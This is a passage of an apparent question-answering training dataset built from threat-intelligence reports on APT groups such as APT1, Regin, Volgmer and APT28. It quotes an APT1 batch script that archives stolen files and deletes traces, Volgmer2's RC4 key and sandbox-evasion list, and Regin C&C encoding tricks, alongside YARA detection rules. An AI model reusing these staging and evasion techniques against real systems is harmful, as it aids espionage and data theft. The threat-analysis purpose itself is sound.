    "output": "CVE-2014-6352 is a vulnerability in Microsoft Windows that allows remote attackers to execute arbitrary code via a crafted OLE object. In the context of the MONSOON APT campaign, this vulnerability is exploited through the use of weaponized documents, specifically PowerPoint files, that contain malicious OLE objects. When a victim opens one of these documents, the vulnerability is triggered, allowing the attackers to execute arbitrary code on the victim's system. The MONSOON campaign uses this vulnerability to drop malware, including the AutoIt backdoor and Unknown Logger, onto the victim's system. These malware components can then be used to steal sensitive information, escalate privileges, and maintain persistence on the system. The use of CVE-2014-6352 in the MONSOON campaign highlights the importance of keeping software up-to-date and patching vulnerabilities in a timely manner, as well as the need for users to be cautious when opening documents from unknown sources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did various adversaries, including TeMPeR PANDA and FANCy BeAR, leverage the Malaysia Airlines incidents (MH370 and MH17) in their operations, and what types of malware were used?",
    "output": "Various adversaries leveraged the Malaysia Airlines incidents (MH370 and MH17) by using them in spear phishing emails to deliver malicious documents. TeMPeR PANDA was particularly prolific in using MH370-related emails to drop malware connecting to a known C2 address. LOTUS PANDA and an actor using Naikon malware were also observed. An adversary believed to have a nexus to Pakistan used a malicious zip archive containing a file named 'Malaysia Airline MH370 hijacked by Pakistan.scr' to deliver BitterBug malware. Operations related to the MH17 crash were more limited but also began within days of the incident. China-based adversaries used decoy documents concerning the black boxes on MH17 and NetTraveler malware. FANCy BeAR targeted victims with Sofacy malware dropped alongside a document concerning the cessation of hostilities around the crash site.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: EXECUTIVE SUMMARY\nSince at least 2019, the Mustang Panda threat actor group has targeted government and public sector organizations across Asia and Europe [3] with long-term cyberespionage campaigns in line with strategic interests of the Chinese government.\nIn November 2022, Mustang Panda shifted from using archive files to using malicious optical disc image (ISO) files containing a shortcut (LNK) file to deliver the modified version of PlugX malware. This switch increases the evasion against anti-malware solutions [2].\nThe Mustang Panda APT group loads the PlugX malware in the memory of legitimate software by employing a four-stage infection chain which leverages malicious shortcut (LNK) files, triggering execution via dynamic-link library (DLL) search-order-hijacking.\n\nQuestion: Why did the Mustang Panda threat actor group shift from using archive files to using malicious optical disc image (ISO) files containing a shortcut (LNK) file to deliver the modified version of PlugX malware? How does this change enhance their evasion tactics against anti-malware solutions?\n\nAnswer:",
    "output": "The Mustang Panda threat actor group shifted from using archive files to using malicious optical disc image (ISO) files containing a shortcut (LNK) file to deliver the modified version of PlugX malware in order to increase their evasion capabilities against anti-malware solutions. This change enhances their evasion tactics because ISO files are often perceived as less suspicious compared to traditional archive files, making it easier for the malware to bypass detection mechanisms employed by anti-malware solutions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Encrypted virtual file system containers\nRegin stores data files and payloads on disk in encrypted virtual file system files. Such files are accessed by the major routines 3Dh. Files stored inside EVFS containers are encrypted with a variant of RC5, using 64-bit blocks and 20 rounds. The encryption mode is reverse cipher feedback (CFB).\nKnown extensions for EVFS containers are *.evt and *.imd. The structure of a container is similar to the FAT file system. One major difference is that files do not have a name; instead, they're identified using a binary tag. The tag itself is the\nconcatenation of a major number and a minor number. The major number typically indicates the major function group that will handle the file.\nA container starts with the header in Table 3 (little-endian ordering).\nThe header is followed by the file entry table (Table 4). Each file entry is 13h+taglen bytes long.\nThe sectors follow (Table 5). A sector of sectsize bytes starts with a DWORD pointing to the next sector (if the file does not fit within a single sector), followed by sectsize-4 bytes of payload data.\nAs explained above, the files are encrypted. Other layers of encryption and compression may also be in place, although those would be handled by higher level components.\nSmall Headline: Command-and-control operations\nRegin's C&C operations are extensive. These backchannel operations are bidirectional, which means either the attackers can initiate communications with compromised computers on the border network or the compromised computers can initiate communications with the attacker. Furthermore, compromised computers can serve as a proxy for other infections and command and control can also happen in a peer-to-peer fashion. All communications are strongly encrypted and can happen in a two-stage fashion where the attacker may contact a compromised computer using one channel to instruct it to begin communications on a different channel. Four transport protocols are available for C&C:\n\u2022 ICMP: Payload information can be encoded and embedded in lieu of legitimate ICMP/ping data. The string 'shit' is scattered in the packet for data validation. In addition, CRC checks use the seed '31337'.\n\u2022 UDP: Raw UDP payload\n\u2022 TCP: Raw TCP payload\n\u2022 HTTP: Payload information can be encoded and embedded within cookie data under the names SESSID, SMSWAP, TW, WINKER, TIMESET, LASTVISIT, AST.NET_SessionId, PHPSESSID, or phpAds_d. This information can be combined with another cookie for validation under the names USERIDTK, UID, GRID, UID=PREF=ID, TM, __utma, LM, TMARK, VERSION, or CURRENT\nThe C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage 5 payloads, such as C375h and 1Bh.\nMedium Headline: Payloads\nRegin can be distributed with various payload modules or receive payload modules after infection. The extensible nature of Regin and its custom payloads indicate that many additional payloads are likely to exist in order to enhance Regin's capabilities. Furthermore, we have found data files accompanying payload modules that have not been recovered. The following table describes the Stage 4 kernel payload modules and Stage 5 user mode payload modules, which we have seen several variants of Regin use.\nThe IIS web server log stealing module, 27E9h, is an example of a payload module that was installed after the initial infection and was specifically deployed for a particular target.\nMedium Headline: 64-bit version\nOnly a small amount of the 64-bit Regin files have been recovered. These samples may represent version 2.0 or their differences may possibly be solely specific to 64-bit versions of Regin. We also recovered files from infected computers that may or may not be associated with 64-bit Regin, including several variants of svcsstat.exe, a file that aims to retrieve binary data over pipes or sockets and execute the data.\nSmall Headline: Stage differences\nThe 64-bit version of Regin's Stage 1 (wshnetc.dll) is no longer a kernel mode driver, as drivers under 64-bit Windows must be signed. Instead, Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting up. Rather than loading Stage 2 from an NTFS extended attribute, Stage 1 looks for the last partition (in terms of\nphysical location) on disk and searches for the payload in the raw sectors in this area of the disk.\nThe 64-bit Regin's Stage 3 has not been recovered. We believe that it may not exist, as the 32-bit version is a driver. Stage 4 is an orchestrator just like its 32-bit counterpart and it uses the same major and minor values to export functionality.\nStage 5 uses the following filenames:\n\u2022 %Windir%\\IME\\IMESC5\\DICTS\\PINTLGBP.IMD contains Stage 5 user payloads, replacing SystemLog.Evt in the 32-bit version\n\u2022 %Windir%\\IME\\IMESC5\\DICTS\\PINTLGBS.IMD contains Stage 5 data files, replacing SecurityLog.Evt in the 32-bit version\n\u2022 The equivalent files for SystemAudit.Evt and SecurityAudit.Evt were not recovered\nNo Stage 5 payload modules have been recovered.\nMedium Headline: Conclusion\nRegin is a highly-complex threat which has been used for large-scale data collection or intelligence gathering campaigns. The development and operation of this threat would have required a significant investment of time and resources. Threats of this nature are rare and are only comparable to the Stuxnet/Duqu family of malware. The discovery of Regin serves to highlight how significant investments continue to be made into the development of tools for use in intelligence gathering. Many components of Regin have still gone undiscovered and additional functionality and versions may exist.\nSmall Headline: Data files\nRegin's data files are classified as Stage 5 components and are contained in an EVFS container.\nAs the data files are stored in a container, they do not have names. Just like Stage 5 modules, they are referenced by their filetag, which is the aggregation of the major and minor identifiers. The major identifier indicates which major routine group likely handles or creates the file.\nNot all data files have been recovered, so the information remains incomplete.\nData files associated with Stage 4 kernel modules have not been recovered\nTable 8 lists recovered data files used by Stage 5 modules.\nThe associated modules that supposedly manipulate those data files were not recovered.\nSmall Headline: About Symantec\nSymantec Corporation (NASDAQ: SYMC) is an information protection expert that helps people, businesses and governments seeking the freedom to unlock the opportunities technology brings -- anytime, anywhere. Founded in April 1982, Symantec, a Fortune 500 company, operating one of the largest global data-intelligence networks, has provided leading security, backup and availability solutions for where vital information is stored, accessed and shared. The company's more than 20,000 employees reside in more than 50 countries. Ninety-nine percent of Fortune 500 companies are Symantec customers. In fiscal 2014, it recorded revenues of $6.7 billion.\nTo learn more go to  or connect with\n/\nSymantec at: .\nBig Headline: For specific country offices and contact numbers, please visit our website.\nSymantec World Headquarters 350 Ellis St.\nMountain View, CA 94043 USA\n+1 (650) 527-8000\n1 (800) 721-3934\nwww.symantec.com\nCopyright \u00a9 2014 Symantec Corporation. All rights reserved. Symantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nRegin: Top-tier espionage tool enables stealthy surveillance\n\nWhat are the key characteristics of Regin's command-and-control (C&C) operations? How does Regin ensure secure communication, and what protocols are used for C&C?",
    "output": "Regin's C&C operations are extensive and bidirectional, allowing both the attackers and compromised computers to initiate communications. Compromised computers can also serve as proxies for other infections, and command and control can occur in a peer-to-peer fashion. All communications are strongly encrypted and can happen in a two-stage fashion. Regin supports four transport protocols for C&C: ICMP, UDP, TCP, and HTTP. Payload information can be encoded and embedded in ICMP/ping data with the string 'shit' for data validation and CRC checks using the seed '31337'. HTTP payloads can be encoded within cookie data under various names and combined with another cookie for validation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Completing The Mission\nSimilar to other APT groups we track, once APT1 finds files of interest they pack them into archive files before stealing them. APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are password protected. Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure 19. (The instances of \"XXXXXXXX\" obfuscate the text that was in the actual batch script.)\n@echo off cd /d c:\\windows\\tasks rar.log a XXXXXXXX.rar -v200m \"C:\\Documents and Settings\\Place\\My Documents\\XXXXXXXX\" -hpsmy123!@# del *.vbs del %0\nFIGure 19: an aPt1 batch script that bundles stolen files into rar archive files\nAfter creating files compressed via RAR, the APT1 attackers will transfer files out of the network in ways that are consistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many times their RAR files are so large that the attacker splits them into chunks before transferring them. (<>)Figure 19 above shows a RAR command with the option \"-v200m\", which means that the RAR file should be split up into 200MB portions.\nFIGure 20: aPt1 bundles stolen files into rar archives before moving data to China\nUnlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1. The first, GETMAIL, was designed specifically to extract email messages, attachments, and folders from within Microsoft Outlook archive (\"PST\") files.\nMicrosoft Outlook archives can be large, often storing years' worth of emails. They may be too large to transfer out of a network quickly, and the intruder may not be concerned about stealing every email. The GETMAIL utility allows APT1 intruders the flexibility to take only the emails between dates of their choice. In one case, we observed an APT1 intruder return to a compromised system once a week for four weeks in a row to steal only the past week's emails.\nWhereas GETMAIL steals email in Outlook archive files, the second utility, MAPIGET, was designed specifically to steal email that has not yet been archived and still resides on a Microsoft Exchange Server. In order to operate successfully, MAPIGET requires username/password combinations that the Exchange server will accept. MAPIGET extracts email from specified accounts into text files (for the email body) and separate attachments, if there are any.\nSmall Headline: english as a second Language\nAPT1's \"It's legit\" email should not mislead someone into thinking that APT1 personnel are all fluent in English, though some undoubtedly are. Their own digital weapons betray the fact that they were programmed by people whose first language is not English. Here are some examples of grammatically incorrect phrases that have made it into APT1's tools over the years.\ntaBLe 7: examples of grammatically incorrect phrases in aPt1 malware\nBig Headline: aPt1: InFrastruCture\nAPT1 maintains an extensive infrastructure of computers around the world. We have evidence suggesting that APT1 manually controls thousands of systems in support of their attacks, and have directly observed their control over hundreds of these systems. Although they control systems in dozens of countries, their attacks originate from four large networks in Shanghai \u2014 two of which are allocated directly to the Pudong New Area, the home of Unit 61398. The sheer number of APT1 IP addresses concentrated in these Shanghai ranges, coupled with Simplified Chinese keyboard layout settings on APT1's attack systems, betrays the true location and language of the operators. To help manage the vast number of systems they control, APT1 has registered hundreds of domain names, the majority of which also point to a Shanghai locale. The domain names and IP addresses together comprise APT1's command and control framework which they manage in concert to camouflage their true origin from their English speaking targets.\nMedium Headline: APT1 Network Origins\nWe are frequently asked why it is an ineffective security measure to just block all IP addresses in China from connecting to your network. To put it simply, it is easy for APT1 attackers to bounce or \"hop\" through intermediary systems such that they almost never connect to a victim network directly from their systems in Shanghai. Using their immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country they choose. The systems in this type of network redirection infrastructure have come to be called \"hop points\" or \"hops.\" Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as camouflage for their attacks without the knowledge of the systems' owners. These systems belong to third-party victims who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data and intellectual property.\nFIGure 21: aPt1 bounces through \"hop point\" systems before accessing victim systems\nWe have observed some of APT1's activities after they cross into (virtual) U.S. territory. They access hop points using a variety of techniques, the most popular being Remote Desktop and FTP. Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different IP addresses with Remote Desktop. Remote Desktop provides a remote user with an interactive graphical interface to a system. The experience is similar to the user actually physically sitting at the system and having direct access to the desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four large net blocks in Shanghai which we will refer to as APT1's home networks.\ntaBLe 8: net blocks corresponding to IP addresses that aPt1 used to access their hop points\nNotably, the registration information for the second and third net blocks above includes this contact information at the end:\nThe registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai, where PLA Unit 61398 is headquartered.\nThe other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea (1). We have confirmed that some of these systems are part of APT1's hop infrastructure and not legitimately owned by APT1 \u2014 in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from Shanghai.\nIn order to make a user's experience as seamless as possible, the Remote Desktop protocol requires client applications to forward several important details to the server, including their client hostname and the client keyboard layout. In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard layout setting was \"Chinese (Simplified) \u2014 US Keyboard.\" Microsoft's Remote Desktop client configures this setting automatically based on the selected language on the client system, making it nearly certain that the APT1 actors managing the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings. \"Simplified Chinese\" is a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland China. Taiwan and municipalities such as Hong Kong still use \"Traditional Chinese\" (zh-tw) character sets.\nThe overwhelming concentration of Shanghai IP addresses and Simplified Chinese language settings clearly indicate that APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai. The only\nalternative is that APT1 has intentionally been conducting a years-long deception campaign to impersonate Chinese speakers from Shanghai in places where victims are not reasonably expected to have any visibility \u2013 and without making a single mistake that might indicate their \"true\" identity.\nSmall Headline: MANUAL WEBC2 UPDATES\nAs covered in the previous \"Attack Lifecycle\" section, WEBC2 backdoor variants download and interpret data stored between tags in HTML pages as commands. They usually download HTML pages from a system within APT1's hop infrastructure. We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages that backdoors will download. Because the commands are usually encoded and difficult to spell from memory, APT1 intruders typically do not type these strings, but instead copy and paste them into the HTML files. They likely generate the encoded commands on their own systems before pasting them in to an HTML file hosted by the hop point. For example, we observed an APT attacker pasting the string \"czo1NA==\" into an HTML page. That string is the base64encoded version of \"s:54\", meaning \"sleep for 54 minutes\" (or hours, depending on the particular backdoor). In lieu of manually editing an HTML file on a hop point, we have also observed APT1 intruders uploading new (already-edited) HTML files.\nAnswer this question: What evidence suggests that APT1's infrastructure is primarily based in Shanghai, and how does this infrastructure support their attacks?",
    "output": "The evidence suggesting that APT1's infrastructure is primarily based in Shanghai includes the concentration of APT1 IP addresses in Shanghai networks, particularly those allocated to the Pudong New Area. Additionally, the use of Simplified Chinese keyboard layout settings on APT1's attack systems indicates that the operators are likely mainland Chinese speakers. APT1 maintains an extensive infrastructure of computers around the world, controlling thousands of systems to support their attacks. This infrastructure includes domain names and IP addresses that comprise their command and control framework, which they manage to camouflage their true origin from English-speaking targets. The sheer number of systems under their control and the specific geographic concentration in Shanghai strongly suggest that APT1 operates from this region.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: DESTOVER \"FORMBOUNDARY\" BACKDOOR, NOV 2015\nThis backdoor has many code overlaps with RandomDomain.B \u2013 for example, it uses CharSwap API obfuscation, and uses the same set of integer commands. It has evolved away from the use of faked SSL, which means whole segments of code have been removed, including most of the domain names used for the SSL handshake. Instead, it connects to the C&C server via regular HTTP on port 80 and initially posts a blob of random data disguised as a legitimate file. Any real content is sent encrypted afterwards, using one of the bytewise XOR encodings known from RandomDomain.\nBig Headline: DESTOVER \"VOLGMER2\" BACKDOOR, JAN 2016\nThis was found as a DLL backdoor sample \"t(x86).dll\" which contained several traits in common with the Volgmer series. Further data mining revealed that identically to Volgmer, the sample is installed by a dropper which contains the DLL in an embedded zip file resource named \"MYRES\" in its body. This dropper is again extracted by another outer dropper with a similar embedded zip inside, which also in addition contains a configuration file ntuser.inf.\nThis config file contains - among other things - C&C IP and port information, which is read and written to a registry key before being used by the main payload component.\nVolgmer2 shares API declaration functions and string decode algorithms with the original Volgmer. However, there are also clear differences. Its network behavior has moved away from HTTP post with the recognizable \"Mozillar\" UserAgent. Instead, C&C traffic is performed via faked SSL with another encryption twist \u2013 RC4 with a layer of XOR on top. They RC4 key is binary, and hardcoded in the executable: 0x0d, 0x06 ,0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82. Similarly to the RandomDomain series, Volgmer2 uses domain names chosen randomly from a list in its SSL handshake.\nThe dropper executables in the \"Volgmer 1\" series contained some checks for VM environments. Volgmer2 has taken this further, and included a number of anti-debugging tricks and of checks for what appears to be known sandbox environments.\nMedium Headline: Volgmer1 vs Volgmer2 dropper evasions.\nThe change also means that the malware continues to work if under a virtualized environment, if there are no other indicators that there is monitoring or debugging activity going on. The check for known sandbox environments is done by comparing the computer name with the names in the following list:\nMARS53\n35347\nJOHN-PC\nTVMCOM\nPLACEHOL-6F699A\nWIN7PRO-MALTEST\nWINDOWS-F99AACA\nXELRCUZ-AZ\nRATS-PC\nPXE472179\nThe command integers used by Volgmer2 are in the range 0x09-0x27 with the exception of 0x17, 0x1b and 0x1c.\nMedium Headline: KorDllbot-related samples\n87bae4517ff40d9a8800ba4d2fa8d2f9df3c2e224e97c4b3c162688f2b0d832e fd95e095658314c9815df6a97558897cb344255bd54d03c965fa4cbd16d7bafd 82169a2d8f15680c93e1436687538afa01d6a2ecfe7a7cb613817c64a1a82342 792b484ac94f0baefc7e016895373ba92c2927e3463f62adb701ddbe4c90604c 162d6223c1c1219ca81a77e60e6b776058517272fe7cac828a3f64dcacd87811 56e0b1794a588e330e32a10813cdc9904e472c55f17dd6c8de341aeaf837d077 c16a66c1d8e681e962f03728411230fe7c618b7294c143422005785d3a724ec4 57b4c2e71f46fe3e7811a80d19200700c15dd358bdf9d9fdf61f1c9a669f7b4b 2d9edf45988614f002b71899740d724008e9a808efad00fa79760b31e0a08073 006e0cc29697db70b2d4319f320aa0e52f78bf876646f687aa313e8ba04e6992 dda136bc51670e57a4b2f091f83ab7b44291a9323d5483abd9e91b78221e027f 163571bd56001963c4dcb0650bb17fa23ba23a5237c21f2401f4e894dfe4f50d 3d2a7ea04d2247b49e2dcad63a179ae6a47237eddbfd354082f1417a63e9696e ea46ed5aed900cd9f01156a1cd446cbb3e10191f9f980e9f710ea1c20440c781 6e8a2329567cdbbba68460ccb97209867d7508983cb638662b33bfe90d0134d4 af7b53ce584b83085488e1190e1458948eaf767631f766e446354d0d5523e9d0 69300a42e055f68a8057192077fbbef3be5b66514ea9ca258b077c5c7e9417a9 e0cd4eb8108dab716f3c2e94e6c0079051bfe9c7c2ed4fcbfdd16b4dd1c18d4d 96c35225dc4cac65cc43a6cc6cdcce3d13b3bda286c8c65cad5f2879f696ad2a 29355f6d4341089b36834b4a941ef96b3bf758a4fe35fbb401cc4e74b9b1c90f 9e226a5eb4de19fcb3f7ecc3abcf52ea22a1f1a42a08dd104f5f7a00164e074e 041605e498bb41b07d2d43003152cc2a992e7e2ade7a47ee9aef2570bdb16d94 82fe3a8f2248643505e8de1977b734f97eb38225e6d3df6ea8f906430514b4f5 08203b4ddc9571418b2631ebbc50bea57a00eadf4d4c28bd882ee8e831577a19 8e3c3398353931c513c32330c07f65b6ee6f62fc7a56edac7cbe4edb1bf4c74e bb4204dd059849848e9492523ce32520bf37cb80974320c0ca71f3b79e83f462 2f8c448bb05ed1218e638c61bb56ebb953b962ed5e065b08fa03cfcf6f6a1c68 f98c67c4cf9b02acaabb555664a0d9d648a1e43f681f9bf234af066d5451be8d 1226d3635c1a216be9316c9dfa97f103c79ed4c44397e5e675d3b1e37786bf31 c5baece9978649659220af2681a3a43b83f8ae47afdd3862185d1fec7735a7d2 a4b982d4e7137d7d3687f3127e6d5c2a8b2be1f53daeebce9175461c7e6a53cd 9bcecd6afa54eb4f343b7eb82a86ceee189cc10bc91fa83f8cdc98cc5aaef117 b7f2595dd62d1174ce6e5ddf43bf2b42f7001c7a4ec3c4cbe3359e30c674ed83 b039383a19e3da74a5a631dfe4e505020a5c5799578187e4ccc016c22872b246 f4a06dd6ebfd0805d445f45ce33d7bba4a33c561111c39a347024069a78169e9 3acaea01fd79484d5a72c72e1b9c2fbf391145fb1533c17a8a83e897d8777f82 81067f057d523fdcddf7df1da39a7c3614c45f6bff6bd387274c049244efda3b 218ee208323dc38ebc7f63dba73fac5541b53d7ce1858131fa3bfd434003091d 73edc54abb3d6b8df6bd1e4a77c373314cbe99a660c8c6eea770673063f55503 6d5d706f5356e087f5961ba2ed808c51876d15c2e09eb081618767b36b1d012f 7a538c3eed1f01b62a19226750c1369e4e9210b1331d5829ca91fe2b69087f06 6059cb08489170aea77caf0940131e5765b153a593e76d93a0f244e89ddb9e90 e97a8909349a072ed945899fbe276fc27e9c5847bc578b0abccf017da3fd680c c4852ddba88e5c53a8711c4c7540b7ac98dac6b9e31d10dd999a81a4f0e117c3 3ebb3d8292a1aa5dc81b028beeefdec0f0448516d6225b336ee37d550ab8c3ab 87e68055959328d857b287e797896d9a96695b69ed300a843eee73319427b3b3 94e14a85a2046b40842f6c898c5f6c3200de3d89c178a9a9f9a639c1d3de9ee9 cd8c729da299b29618819afeef8b2a79451e6c3d35dea3769ef638c649c69001 9d9889585f1a4048a3955d3a9cead2f426a509afaeacad27540382cc3266f0fa 888844c040be9d0fc3dab00dd004aa9e8619f939aff2eba21e4f48ca20e13784\nd7044a35e76543a03cd343d71652c7bbd9a28e246d7f3a43f4a2e75cd0ef7366 50974c15a546e961fbee8653e5725960a77b79e0f7c8eadf3b6d35ba3a46dd57 bfb5fa2a09ac60efcc0e9f05e781bd22cae0b8f6ba356d7819285f073845a0eb 9bc8fe605a4ad852894801271efd771da688d707b9fbe208106917a0796bbfdc 7b171a160cb2a17f87ca6a4a1c62b4cd9e718f987b7278d3effe0614b5b51be4 0a27acaaebc7db0878239b40ab9d2feff13888839c05a03348fc09b78de6ced5\n\nWhat are the key differences between Volgmer1 and Volgmer2 in terms of network behavior, encryption methods, and anti-debugging techniques? How do these differences impact the effectiveness of existing security measures?",
    "output": "Volgmer2 introduces several key differences compared to Volgmer1. In terms of network behavior, Volgmer2 has moved away from HTTP POST with the recognizable 'Mozillar' UserAgent and now performs C&C traffic via faked SSL with an additional layer of encryption\u2014RC4 with a layer of XOR on top. The RC4 key is binary and hardcoded in the executable. Additionally, Volgmer2 uses domain names chosen randomly from a list in its SSL handshake, similar to the RandomDomain series. Regarding anti-debugging techniques, Volgmer2 includes a number of tricks and checks for known sandbox environments, expanding on the VM environment checks present in Volgmer1. These differences impact the effectiveness of existing security measures by making the malware harder to detect and analyze. The use of faked SSL with additional encryption layers complicates traffic analysis, while enhanced anti-debugging techniques make it more challenging to reverse-engineer the malware in controlled environments. Cybersecurity experts need to adapt their tools and methodologies to counter these advancements effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "[tr1adx]: Intel\ntr1adx Intelligence Bulletin (TIB) 00001: Bear Hunting Season: Tracking APT28 [December 28, 2016]\nSummary\nOur APT28 (a.k.a. Fancy Bear, Sofacy) friends in the Russian Federation have been busy once again. Not only have they been busy staying in the spotlight with recent news coverage around the DNC breach and tracking of Ukrainian Field Artillery Units, but also with registering plenty of domains at a pace akin to those mileage runs folks do before year end to re-qualify for airline status.\nInvestigations we have conducted show recent campaigns focused on a plethora of targets in various countries and/or regions, including:\nArmenia\nTurkey\nLithuania\nBelarus\nMalaysia\nMiddle East\nUkraine\nSlovakia\nKazahstan\nSpain\nUnited Kingdom\nArgentina\nJapan\nHong Kong\nIndia\nTaiwan\nGhana\nEuropean Union Institutions\nNATO Affiliated Targets\nTargets include:\nMilitary\nDefense Industry\nGovernment\nNon Governmental Organizations (NGO's)\nAdvocacy Groups\nLaw Enforcement\nLaw Firms and Legal Services\nJournalism / News Organizations\nParticular individuals / persons of interest\nOil & Gas Industry\nAnalysis\nTTP's associated with this Threat Actor allow us to track APT28's activities with a high/moderate degree of confidence, and follow their trail of breadcrumbs. From an overall TTP perspective, not much has changed; APT28 is a huge fan of registering domain names that appear to be legitimate and/or associated with their targets. APT28 will then leverage spear phishing or other methods to entice their targets to visit web sites hosted on these domains in an attempt to harvest credentials, or other desired information. Subsequently, the Threat Actor will generally install Sofacy, Agent-X malware for persistence and command & control of the acquired targets.\nWhile the majority of TTP's (tradecraft) related to APT28 have not changed, we did discover two separate instances where registered domains were specifically tailored to target particular individuals / persons of interest, down to the level of showing what seem to be copies of passport photographs of these individuals in what appears to be an attempt to legitimize the infrastructure associated with the campaign. Furthermore, investigation of configuration files associated with these campaigns concluded that the Threat Actor had already gathered valid credentials of the user, which were hard coded into the mock application. It appears extortion may be an intended effect of this particular piece of the campaign; as such we have made a conscious decision not to publicize any Indicators of Compromise associated with the extortion elements.\nIndicators of Compromise\n\nHow does APT28 leverage domain registration and spear phishing to compromise its targets, and what specific tactics have been observed in recent campaigns?",
    "output": "A: APT28, also known as Fancy Bear or Sofacy, leverages domain registration and spear phishing by creating domain names that appear legitimate and are often associated with their targets. These domains are used to host websites designed to entice targets into visiting them, with the goal of harvesting credentials or other sensitive information. Once the initial compromise is achieved, APT28 typically installs Sofacy or Agent-X malware for persistence and command & control of the compromised systems. In recent campaigns, APT28 has been observed tailoring domains to target specific individuals, even using copies of passport photographs to legitimize the infrastructure. Additionally, configuration files from these campaigns indicate that the threat actor had already gathered valid user credentials, which were hard-coded into mock applications, suggesting extortion as a possible motive.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the APT group behind the CosmicDuke campaign utilize the CVE-2010-0232 vulnerability in their malware?",
    "output": "CVE-2010-0232 is a Windows Kernel Exception Handler Vulnerability that allows local users to gain privileges by crafting a VDM_TIB data structure in the Thread Environment Block (TEB) and then calling the NtVdmControl function to start the Windows Virtual DOS Machine (aka NTVDM) subsystem. According to the context, the CosmicDuke campaign, attributed to a Russian APT group, utilized this vulnerability in their malware. Specifically, early variants of the privilege escalation module in CosmicDuke attempted to exploit CVE-2010-0232 or CVE-2010-4398. This suggests that the APT group was trying to leverage this vulnerability to gain elevated privileges on infected systems, allowing them to carry out more sophisticated attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: YARA Signatures\nNote: These rules are designed to broadly capture suspicious files and are not designed to detect a particular malware or threat.\n{\nmeta:\nauthor = \"Mandiant\"\ndate_created = \"2022-01-13\"\ndate_modified = \"2022-01-13\"\nrev = 1\nstrings:\n$s1 = \"auth-agent@openssh.com\"\n$s2 = \"auth-%.8x-%d\"\n$s3 = \"Child connection from %s:%s\"\n$s4 = \"Compiled without normal mode, can't run without -i\"\n$s5 = \"cancel-tcpip-forward\"\n$s6 = \"dropbear_prng\"\n$s7 = \"cron\"\ncondition:\nuint32be(0) == 0x7F454C46 and filesize < 2MB and all of them\n}\nrule REGEORG_Tuneller_generic\n{\nmeta:\nauthor = \"Mandiant\"\ndate_created = \"2021-12-20\"\ndate_modified = \"2021-12-20\"\nmd5 = \"ba22992ce835dadcd06bff4ab7b162f9\"\nstrings:\n$s1 = \"System.Net.IPEndPoint\"\n$s2 = \"Response.AddHeader\"\n$s3 = \"Request.InputStream.Read\"\n$s4 = \"Request.Headers.Get\"\n$s5 = \"Response.Write\"\n$s6 = \"System.Buffer.BlockCopy\"\n$s7 = \"Response.BinaryWrite\"\n$s8 = \"SocketException soex\"\ncondition:\nfilesize < 1MB and 7 of them\n}\n{\nauthor = \"Mandiant\"\ndate_created = \"2022-01-19\"\ndate_modified = \"2022-01-19\"\n$h1 = { DD E5 D5 97 20 53 27 BF F0 A2 BA CD 96 35 9A AD 1C 75 EB 47 }\nuint32be(0) == 0x7F454C46 and filesize < 10MB and all of them }\n\nHow does the YARA rule designed to detect QUIETEXIT, the backdoor used by UNC3524, function? What specific strings and conditions does it look for to identify potentially suspicious files related to this backdoor?",
    "output": "The YARA rule designed to detect QUIETEXIT, the backdoor used by UNC3524, functions by looking for specific strings and conditions within files. The rule checks for the presence of several strings such as 'auth-agent@openssh.com', 'auth-%.8x-%d', 'Child connection from %s:%s', 'Compiled without normal mode, can't run without -i', 'cancel-tcpip-forward', 'dropbear_prng', and 'cron'. Additionally, the rule specifies that the file must start with the ELF magic number (0x7F454C46) and have a size less than 2MB. The condition for triggering the rule is that all of these strings must be present in the file.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
